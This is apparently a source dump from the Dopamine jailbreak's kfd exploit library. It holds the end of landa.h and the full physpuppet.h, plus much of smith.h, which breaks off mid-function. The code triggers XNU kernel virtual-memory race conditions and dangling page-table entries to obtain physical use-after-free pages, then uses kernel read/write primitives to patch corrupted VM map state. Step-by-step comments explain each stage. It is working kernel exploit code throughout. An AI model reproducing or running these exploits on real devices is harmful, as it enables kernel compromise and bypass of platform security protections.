     * - src_vme_1 has a size of pages(1) and owns the only reference to src_vmo_1.
     * - src_vme_2 has a size of pages(1) and owns the only reference to src_vmo_2.
     * - src_vme_3 has a size of pages(X) and owns the only reference to src_vmo_3.
     */
    vm_address_t src_address = 0;
    vm_size_t src_size = copy_size;
    assert_mach(vm_allocate(mach_task_self(), &src_address, src_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    landa->copy_src_address = src_address;

    vm_address_t vme1_src_address = src_address;
    vm_address_t vme2_src_address = vme1_src_address + landa_vme1_size;
    vm_address_t vme3_src_address = vme2_src_address + landa_vme2_size;
    assert_mach(vm_allocate(mach_task_self(), &vme1_src_address, landa_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_src_address, landa_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme3_src_address, landa_vme3_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));

    landa->vme1_src_addr = vme1_src_address;
    landa->vme2_src_addr = vme2_src_address;
    landa->vme3_src_addr = vme3_src_address;
    landa->vme1_src_size = landa_vme1_size;
    landa->vme2_src_size = landa_vme2_size;
    landa->vme3_src_size = landa_vme3_size;
    
    memset((void*)(src_address), 'A', copy_size);

    /*
     * STEP 1B:
     *
     * Allocate the destination VMEs and VMOs:
     * - dst_vme_1 has a size of pages(1) and owns the only reference to dst_vmo_1.
     *   dst_vme_1->user_wired_count == MAX_WIRE_COUNT, because of the mlock() for-loop.
     * - dst_vme_2 has a size of pages(1) and owns the only reference to dst_vmo_2.
     *   dst_vme_2->is_shared == TRUE, because of the vm_remap() on itself.
     *   dst_vme_2->user_wired_count == 1, because of mlock().
     * - After the clip in vm_protect(), dst_vme_3 has a size of pages(X) and dst_vme_4 has a size of pages(1).
     *   dst_vme_3 and dst_vme_4 each have a reference to dst_vmo_3.
     */
    vm_address_t dst_address = 0;
    vm_size_t dst_size = copy_size + landa_vme4_size;
    assert_mach(vm_allocate(mach_task_self(), &dst_address, dst_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR));
    landa->copy_dst_address = dst_address;

    vm_address_t vme1_dst_address = dst_address;
    vm_address_t vme2_dst_address = vme1_dst_address + landa_vme1_size;
    vm_address_t vme3_dst_address = vme2_dst_address + landa_vme2_size;
    vm_address_t vme4_dst_address = vme3_dst_address + landa_vme3_size;
    vm_prot_t cur_protection = VM_PROT_DEFAULT;
    vm_prot_t max_protection = VM_PROT_ALL;
    assert_mach(vm_allocate(mach_task_self(), &vme1_dst_address, landa_vme1_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &vme2_dst_address, landa_vme2_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_remap(mach_task_self(), &vme2_dst_address, landa_vme2_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
        mach_task_self(), vme2_dst_address, FALSE, &cur_protection, &max_protection, VM_INHERIT_DEFAULT));
    assert_mach(vm_allocate(mach_task_self(), &vme3_dst_address, landa_vme3_size + landa_vme4_size, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE));
    assert_mach(vm_protect(mach_task_self(), vme4_dst_address, landa_vme4_size, FALSE, VM_PROT_READ));

    // vme4_dst_address will get deallocated by the exploit process
    landa->vme1_dst_addr = vme1_dst_address;
    landa->vme2_dst_addr = vme2_dst_address;
    landa->vme3_dst_addr = vme3_dst_address;
    landa->vme1_dst_size = landa_vme1_size;
    landa->vme2_dst_size = landa_vme2_size;
    landa->vme3_dst_size = landa_vme3_size;
    
    memset((void*)(dst_address), 'B', copy_size);

    for (u64 i = 0; i < UINT16_MAX; i++) {
        assert_bsd(mlock((void*)(vme1_dst_address), landa_vme1_size));
    }

    assert_bsd(mlock((void*)(vme2_dst_address), landa_vme2_size));

    /*
     * STEP 2:
     *
     * Trigger the race condition between vm_copy() in the main thread and mlock() in the spinner thread.
     */
    pthread_t spinner_thread = NULL;
    assert_bsd(pthread_create(&spinner_thread, NULL, landa_helper_spinner_pthread, kfd));

    while (!atomic_load(&landa->spinner_thread_started)) {
        usleep(10);
    }

    assert_mach(vm_copy(mach_task_self(), src_address, copy_size, dst_address));
    atomic_store(&landa->main_thread_returned, true);
    assert_bsd(pthread_join(spinner_thread, NULL));

    /*
     * STEP 3:
     *
     * Deallocate dst_vme_4, which will in turn deallocate the last reference of dst_vmo_3.
     * Therefore, dst_vmo_3 will be reaped and its pages put back on the free list.
     * However, we now have a PUAF on up to X of those pages in the VA range of dst_vme_3.
     */
    assert_mach(vm_deallocate(mach_task_self(), vme4_dst_address, landa_vme4_size));

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = vme3_dst_address + pages(i);
    }
}

void landa_cleanup(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), landa->copy_src_address, landa->copy_size));

    vm_address_t address1 = landa->copy_dst_address;
    vm_size_t size1 = min_puaf_page_uaddr - landa->copy_dst_address;
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (landa->copy_dst_address + landa->copy_size) - address2;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

void landa_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = 0;
    u64 kwrite_page_uaddr = 0;
    if(kfd->kread.krkw_object_uaddr) {
        kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
        assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    }
    if(kfd->kwrite.krkw_object_uaddr) {
        kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
        if (kwrite_page_uaddr != kread_page_uaddr) {
            assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
        }
    }
}

/*
 * Helper landa functions.
 */

void* landa_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);

    atomic_store(&landa->spinner_thread_started, true);

    while (!atomic_load(&landa->main_thread_returned)) {
        kern_return_t kret = mlock((void*)(landa->copy_dst_address), landa->copy_size);
        assert((kret == KERN_SUCCESS) || ((kret == (-1)) && (errno == ENOMEM)));
        if (kret == KERN_SUCCESS) {
            break;
        }
    }

    return NULL;
}

/*
 * Cleanup function in case of lander failure
 */

void landa_helper_deallocate(task_t task, unsigned int level, vm_address_t min, vm_address_t max,
                             vm_address_t tgt_addr, vm_size_t tgt_size)
{
    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth;
    
    for(vm_address_t addr = min; 1; addr += size) {
        // get next memory region
        depth = level;
        if(vm_region_recurse_64(task, &addr, &size, &depth, (vm_region_info_t)&info, &info_count) != KERN_SUCCESS) {
            break;
        }
        
        if(addr >= max) {
            addr = max;
        }
        
        if(addr >= max) {
            break;
        }
        
        if(tgt_addr == addr && tgt_size == size) {
            vm_deallocate(mach_task_self(), addr, size);
            return;
        }
        
        if(info.is_submap) {
            landa_helper_deallocate(task, level + 1, addr, addr + size, tgt_addr, tgt_size);
        }
    }
}

void landa_deallocate(struct kfd* kfd)
{
    struct landa_data* landa = (struct landa_data*)(kfd->puaf.puaf_method_data);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme1_src_addr, landa->vme1_src_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme2_src_addr, landa->vme2_src_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme3_src_addr, landa->vme3_src_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme1_dst_addr, landa->vme1_dst_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme2_dst_addr, landa->vme2_dst_size);
    landa_helper_deallocate(mach_task_self(), 0, 0, ~0, landa->vme3_dst_addr, landa->vme3_dst_size);
}

#endif /* landa_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/puaf/physpuppet.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef physpuppet_h
#define physpuppet_h

const u64 physpuppet_vmne_size = pages(2) + 1;
const u64 physpuppet_vme_offset = pages(1);
const u64 physpuppet_vme_size = pages(2);

void physpuppet_init(struct kfd* kfd)
{
    /*
     * Nothing to do.
     */
    return;
}

void physpuppet_run(struct kfd* kfd)
{
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        /*
         * STEP 1:
         *
         * Create a vm_named_entry. It will be backed by a vm_object with a
         * vo_size of 3 pages and an initial ref_count of 1.
         */
        mach_port_t named_entry = MACH_PORT_NULL;
        assert_mach(mach_memory_object_memory_entry_64(mach_host_self(), true, physpuppet_vmne_size, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry));

        /*
         * STEP 2:
         *
         * Map the vm_named_entry into our vm_map. This will create a
         * vm_map_entry with a vme_start that is page-aligned, but a vme_end
         * that is not (vme_end = vme_start + 1 page + 1 byte). The new
         * vm_map_entry's vme_object is shared with the vm_named_entry, and
         * therefore its ref_count goes up to 2. Finally, the new vm_map_entry's
         * vme_offset is 1 page.
         */
        vm_address_t address = 0;
        assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));

        /*
         * STEP 3:
         *
         * Fault in both pages covered by the vm_map_entry. This will populate
         * the second and third vm_pages (by vmp_offset) of the vm_object. Most
         * importantly, this will set the two L3 PTEs covered by that virtual
         * address range with read and write permissions.
         */
        memset((void*)(address), 'A', physpuppet_vme_size);

        /*
         * STEP 4:
         *
         * Unmap that virtual address range. Crucially, when vm_map_delete()
         * calls pmap_remove_options(), only the first L3 PTE gets cleared. The
         * vm_map_entry is deallocated and therefore the vm_object's ref_count
         * goes down to 1.
         */
        assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));

        /*
         * STEP 5:
         *
         * Destroy the vm_named_entry. The vm_object's ref_count drops to 0 and
         * therefore is reaped. This will put all of its vm_pages on the free
         * list without calling pmap_disconnect().
         */
        assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
        kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;

        /*
         * STEP 6:
         *
         * At this point, we have a dangling L3 PTE. However, there's a
         * discrepancy between the vm_map and the pmap. If not fixed, it will
         * cause a panic when the process exits. Therefore, we need to reinsert
         * a vm_map_entry in that virtual address range. We also need to fault
         * in the first page to populate the vm_object. Otherwise,
         * vm_map_delete() won't call pmap_remove_options() on exit. But we
         * don't fault in the second page to avoid overwriting our dangling PTE.
         */
        assert_mach(vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED));
        memset((void*)(address), 'A', physpuppet_vme_offset);
    }
}

void physpuppet_cleanup(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
        if ((puaf_page_uaddr == kread_page_uaddr) || (puaf_page_uaddr == kwrite_page_uaddr)) {
            continue;
        }

        assert_mach(vm_deallocate(mach_task_self(), puaf_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

void physpuppet_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

#endif /* physpuppet_h */

```

`Application/Dopamine/Exploits/kfd/Exploit/libkfd/puaf/smith.h`:

```h
/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef smith_h
#define smith_h

/*
 * This boolean parameter determines whether the vm_map_lock() is taken from
 * another thread before attempting to clean up the VM map in the main thread.
 */
const bool take_vm_map_lock = true;

// Forward declarations for helper functions.
void smith_helper_init(struct kfd* kfd);
void* smith_helper_spinner_pthread(void* arg);
void* smith_helper_cleanup_pthread(void* arg);
void smith_helper_cleanup(struct kfd* kfd);

/*
 * This structure is allocated once in smith_init() and contains all the data
 * needed/shared across multiple functions for the PUAF part of the exploit.
 */
struct smith_data {
    atomic_bool main_thread_returned;
    atomic_int started_spinner_pthreads;
    struct {
        vm_address_t address;
        vm_size_t size;
    } vme[5];
    struct {
        pthread_t pthread;
        atomic_bool should_start;
        atomic_bool did_start;
        atomic_uintptr_t kaddr;
        atomic_uintptr_t right;
        atomic_uintptr_t max_address;
    } cleanup_vme;
};

/*
 * This function is responsible for the following:
 * 1. Allocate the singleton "smith_data" structure. See the comment above the
 *    smith_data structure for more info.
 * 2. Call smith_helper_init() which is responsible to initialize everything
 *    needed for the PUAF part of the exploit. See the comment above
 *    smith_helper_init() for more info.
 */
void smith_init(struct kfd* kfd)
{
    kfd->puaf.puaf_method_data_size = sizeof(struct smith_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);

    smith_helper_init(kfd);
}

/*
 * This function is responsible to run the bulk of the work, from triggering the
 * initial vulnerability to achieving a PUAF on an arbitrary number of pages.
 * It is described in detail in the write-up, with a figure illustrating the
 * relevant kernel state after each step.
 */
void smith_run(struct kfd* kfd)
{
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    /*
     * STEP 1:
     */
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[2].address, smith->vme[2].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[1].address, smith->vme[1].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[0].address, smith->vme[0].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[3].address, smith->vme[3].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[4].address, smith->vme[4].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));

    /*
     * STEP 2:
     *
     * Note that vm_copy() in the main thread corresponds to substep 2A in the write-up
     * and vm_protect() in the spawned threads corresponds to substep 2B.
     */
    const u64 number_of_spinner_pthreads = 4;
    pthread_t spinner_pthreads[number_of_spinner_pthreads] = {};

    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        assert_bsd(pthread_create(&spinner_pthreads[i], NULL, smith_helper_spinner_pthread, kfd));
    }

    while (atomic_load(&smith->started_spinner_pthreads) != number_of_spinner_pthreads) {
        usleep(10);
    }

    assert(vm_copy(mach_task_self(), smith->vme[2].address, (0ull - smith->vme[2].address - 1), 0) == KERN_PROTECTION_FAILURE);
    atomic_store(&smith->main_thread_returned, true);

    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        /*
         * I am not sure if joining the spinner threads here will cause the
         * deallocation of their stack in the VM map. I have never ran into
         * panics because of this, but it is something to keep in mind.
         * Otherwise, if it becomes a problem, we can simply make those spinner
         * threads sleep in a loop until the main thread sends them a signal
         * that the cleanup is finished.
         */
        assert_bsd(pthread_join(spinner_pthreads[i], NULL));
    }

    /*
     * STEP 3:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[3].address, smith->vme[3].size, smith->vme[1].address));
    memset((void*)(smith->vme[1].address), 'A', smith->vme[1].size);

    /*
     * STEP 4:
     */
    assert_mach(vm_protect(mach_task_self(), smith->vme[1].address, smith->vme[3].size, false, VM_PROT_DEFAULT));

    /*
     * STEP 5:
     */
    assert_mach(vm_copy(mach_task_self(), smith->vme[4].address, smith->vme[4].size, smith->vme[0].address));

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = smith->vme[1].address + pages(i);
    }
}

/*
 * This function is responsible for the following:
 * 1. Call smith_helper_cleanup() which is responsible to patch up the corrupted
 *    state of our VM map. Technically, this is the only thing that is required
 *    to get back to a safe state, which means there is no more risk of a kernel
 *    panic if the process exits or performs any VM operation.
 * 2. Deallocate the unused virtual memory that we allocated in step 1 of
 *    smith_run(). In other words, we call vm_deallocate() for the VA range
 *    covered by those 5 map entries (i.e. vme0 to vme4 in the write-up), except
 *    for the two pages used by the kread/kwrite primitive. This step is not
 *    required for "panic-safety".
 */
void smith_cleanup(struct kfd* kfd)
{
    smith_helper_cleanup(kfd);

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);

    vm_address_t address1 = smith->vme[0].address;
    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));

    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));

    /*
     * No middle block if the kread and kwrite pages are the same or back-to-back.
     */
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

/*
 * This function is responsible to deallocate the virtual memory for the two
 * pages used by the kread/kwrite primitive, i.e. the two pages that we did not
 * deallocate during smith_cleanup(). Once again, this step is not required for
 * "panic-safety". It can be called either if the kread/kwrite primitives no
 * longer rely on kernel objects that are controlled through the PUAF primitive,
 * or if we want to completely tear down the exploit.
 */
void smith_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
    }
}

/*
 * This function is responsible for the following:
 * 1. If the constant "target_hole_size" is non-zero, it will allocate every
 *    hole in our VM map starting at its min_offset, until we find a hole at
 *    least as big as that value (e.g. 10k pages). The reason for that is that
 *    we will corrupt the hole list when we trigger the vulnerability in
 *    smith_run(), such that only the first hole is safe to allocate from. This
 *    is exactly what happens during a typical call to vm_allocate() with
 *    VM_FLAGS_ANYWHERE. That said, many other VM operations that modify our map
 *    entries or our hole list could cause a kernel panic. So, if it is possible
 *    at all, it is much safer to suspend all other threads running in the target
 *    process (e.g. WebContent). In that case, since we would control the only
 *    running threads during the critical section, we could guarantee that no
 *    unsafe VM operations will happen and "target_hole_size" can be set to 0.
 * 2. We need to find the VA range from which we will allocate our 5 map entries
 *    in smith_run() during step 1 (i.e. vme0 to vme4 in the write-up). Those 5
 *    map entries will cover (3X+5) pages, where X is the desired number of
 *    PUAF pages. For reasons that are explained in the write-up, we want to
 *    allocate them towards the end of our VM map. Therefore, we find the last
 *    hole that is big enough to hold our 5 map entries.
 */
void smith_helper_init(struct kfd* kfd)
{
    const u64 target_hole_size = pages(10000);
    bool found_target_hole = false;

    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    smith->vme[0].size = pages(1);
    smith->vme[1].size = pages(kfd->puaf.number_of_puaf_pages);
    smith->vme[2].size = pages(1);
    smith->vme[3].size = (smith->vme[1].size + smith->vme[2].size);
    smith->vme[4].size = (smith->vme[0].size + smith->vme[3].size);
    u64 smith_total_size = (smith->vme[3].size + smith->vme[4].size + smith->vme[4].size);

    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    /*
     * If the boolean parameter "take_vm_map_lock" is turned on, we spawn the
     * thread running smith_helper_cleanup_pthread() right here. Please see the
     * comment above smith_helper_cleanup_pthread() for more info.
     */
    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.max_address, max_address);
        assert_bsd(pthread_create(&smith->cleanup_vme.pthread, NULL, smith_helper_cleanup_pthread, kfd));
    }

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    vm_address_t vme0_address = 0;
    vm_address_t prev_vme_end = 0;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if ((kret == KERN_INVALID_ADDRESS) || (address >= max_address)) {
            if (found_target_hole) {
                vm_size_t last_hole_size = max_address - prev_vme_end;
                /*
                 * If "target_hole_size" is zero, we could instead simply set
                 * "vme0_address" to (map->max_offset - smith_total_size),
                 * after making sure that this VA range is not already mapped.
                 */
                if (last_hole_size >= (smith_total_size + pages(1))) {
                    vme0_address = (max_address - smith_total_size);
                }
            }

            break;
        }

        assert(kret == KERN_SUCCESS);

        /*
         * Quick hack: pre-fault code pages to avoid faults during the critical section.
         */
        if (data.protection & VM_PROT_EXECUTE) {
            for (u64 page_address = address; page_address < address + size; page_address += pages(1)) {
                u64 tmp_value = *(volatile u64*)(page_address);
            }
        }

        vm_address_t hole_address = prev_vme_end;
        vm_size_t hole_size = address - prev_vme_end;

        if (prev_vme_end < min_address) {
            goto next_vm_region;
        }

        if (found_target_hole) {
            if (hole_size >= (smith_total_size + pages(1))) {
                vme0_address = (address - smith_total_size);
            }
        } else {
            if (hole_size >= target_hole_size) {
                found_target_hole = true;
            } else if (hole_size > 0) {
                assert_mach(vm_allocate(mach_task_self(), &hole_address, hole_size, VM_FLAGS_FIXED));
            }
        }

next_vm_region:
        address += size;
        size = 0;
        prev_vme_end = address;
    }

    assert(found_target_hole);

    smith->vme[0].address = vme0_address;
    smith->vme[1].address = smith->vme[0].address + smith->vme[0].size;
    smith->vme[2].address = smith->vme[1].address + smith->vme[1].size;
    smith->vme[3].address = smith->vme[2].address + smith->vme[2].size;
    smith->vme[4].address = smith->vme[3].address + smith->vme[3].size;
}

/*
 * This function is ran by 4 spinner threads spawned from smith_run() in step 2.
 * It simply attempts to change the protection of virtual page zero to
 * VM_PROT_WRITE in a busy-loop, which will return KERN_INVALID_ADDRESS until
 * the main thread triggers the bad clip in vm_map_copyin_internal(). At that
 * point, vm_protect() will return KERN_SUCCESS. Finally, once the main thread
 * returns from vm_copy(), it will set "main_thread_returned" to true in order
 * to signal all 4 spinner threads to exit.
 */
void* smith_helper_spinner_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    atomic_fetch_add(&smith->started_spinner_pthreads, 1);

    while (!atomic_load(&smith->main_thread_returned)) {
        kern_return_t kret = vm_protect(mach_task_self(), 0, pages(1), false, VM_PROT_WRITE);
        assert((kret == KERN_SUCCESS) || (kret == KERN_INVALID_ADDRESS));
    }

    return NULL;
}

#define store_for_vme(kaddr) ((kaddr) ? (((kaddr) + offsetof(struct vm_map_entry, store.entry.rbe_left))) : (kaddr))
#define vme_for_store(kaddr) ((kaddr) ? (((kaddr) - offsetof(struct vm_map_entry, store.entry.rbe_left)) & (~1ull)) : (kaddr))

/*
 * This function is only ran from a thread spawned in smith_helper_init() if the
 * boolean parameter "take_vm_map_lock" is turned on. The reason why it is
 * spawned that early, instead of at the beginning of smith_helper_cleanup(), is
 * that pthread creation will allocate virtual memory for its stack, which might
 * cause a kernel panic because we have not patched the corrupted VM map state
 * yet. It sleeps for 1 ms in a loop until the main thread sets
 * "cleanup_vme.should_start" to true to signal this thread to start the
 * procedure to take the vm_map_lock(). It does so by patching the right child
 * of a map entry to point back to itself, then it sets "cleanup_vme.did_start"
 * to true to signal the main thread to start patching the state, and finally it
 * calls vm_protect(), which will take the vm_map_lock() indefinitely while
 * vm_map_lookup_entry() spins on the right child. Once the main thread has
 * finished patching up the state, it will restore the right child to its
 * original value, which will cause vm_protect() to return and this pthread to
 * exit.
 */
void* smith_helper_cleanup_pthread(void* arg)
{
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    vm_address_t max_address = atomic_load(&smith->cleanup_vme.max_address);
    vm_address_t cleanup_vme_end = 0;

    while (!atomic_load(&smith->cleanup_vme.should_start)) {
        usleep(1000);
    }

    do {
        /*
         * Find the last entry with vme_end smaller than the map's max_offset,
         * with a right child that is not null, but not the entry we are going to leak.
         */
        u64 map_kaddr = kfd->info.kaddr.current_map;
        u64 entry_kaddr = dynamic_kget(vm_map__hdr_links_prev, map_kaddr);

        while (true) {
            u64 entry_prev = static_kget(struct vm_map_entry, links.prev, entry_kaddr);
            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);
            u64 entry_right = static_kget(struct vm_map_entry, store.entry.rbe_right, entry_kaddr);

            if ((entry_end < max_address) && (entry_right != 0) && (entry_start != 0)) {
                /*
                 * Patch the entry to have its right child point to itself.
                 */
                atomic_store(&smith->cleanup_vme.kaddr, entry_kaddr);
                atomic_store(&smith->cleanup_vme.right, entry_right);
                static_kset(struct vm_map_entry, store.entry.rbe_right, store_for_vme(entry_kaddr), entry_kaddr);
                cleanup_vme_end = entry_end;
                break;
            }

            entry_kaddr = entry_prev;
        }
    } while (0);

    atomic_store(&smith->cleanup_vme.did_start, true);
    vm_protect(mach_task_self(), cleanup_vme_end, pages(1), false, VM_PROT_ALL);
    return NULL;
}

/*
 * This function is responsible to patch the corrupted state of our VM map. If
 * the boolean parameter "take_vm_map_lock" is turned on, please see the comment
 * above smith_helper_cleanup_pthread() for more info. Otherwise, the rest of
 * the function simply uses the kread primitive to scan the doubly-linked list
 * of map entries as well as the hole list, and the kwrite primitive to patch it
 * up. This procedure is explained in detail in part C of the write-up.
 */
void smith_helper_cleanup(struct kfd* kfd)
{
    assert(kfd->info.kaddr.current_map);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);

    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.should_start, true);
        while (!atomic_load(&smith->cleanup_vme.did_start)) {
            usleep(10);
        }

        /*
         * Sleep an extra 100 us to make sure smith_helper_cleanup_pthread()
         * had the time to take the vm_map_lock().
         */
        usleep(100);
    }

    u64 map_kaddr = kfd->info.kaddr.current_map;

    do {
        /*
         * Scan map entries: we use the kread primitive to loop through every
         * map entries in our VM map, and record the information that we need to
         * patch things up below. There are some assertions along the way to
         * make sure the state of the VM map is corrupted as expected.
         */
        u64 entry_count = 0;
        u64 entry_kaddr = dynamic_kget(vm_map__hdr_links_next, map_kaddr);
        u64 map_entry_kaddr = map_kaddr + dynamic_info(vm_map__hdr_links_prev);
        u64 first_vme_kaddr = 0;
        u64 first_vme_parent_store = 0;
        u64 second_vme_kaddr = 0;
        u64 second_vme_left_store = 0;
        u64 vme_end0_kaddr = 0;
        u64 vme_end0_start = 0;
        u64 leaked_entry_right_store = 0;
        u64 leaked_entry_parent_store = 0;
        u64 leaked_entry_prev = 0;
        u64 leaked_entry_next = 0;
        u64 leaked_entry_end = 0;

        while (entry_kaddr != map_entry_kaddr) {
            entry_count++;
            u64 entry_next = static_kget(struct vm_map_entry, links.next, entry_kaddr);
            u64 entry_start = static_kget(struct vm_map_entry, links.start, entry_kaddr);
            u64 entry_end = static_kget(struct vm_map_entry, links.end, entry_kaddr);

            if (entry_count == 1) {
                first_vme_kaddr = entry_kaddr;
                first_vme_parent_store = static_kget(struct vm_map_entry, store.entry.rbe_parent, entry_kaddr);
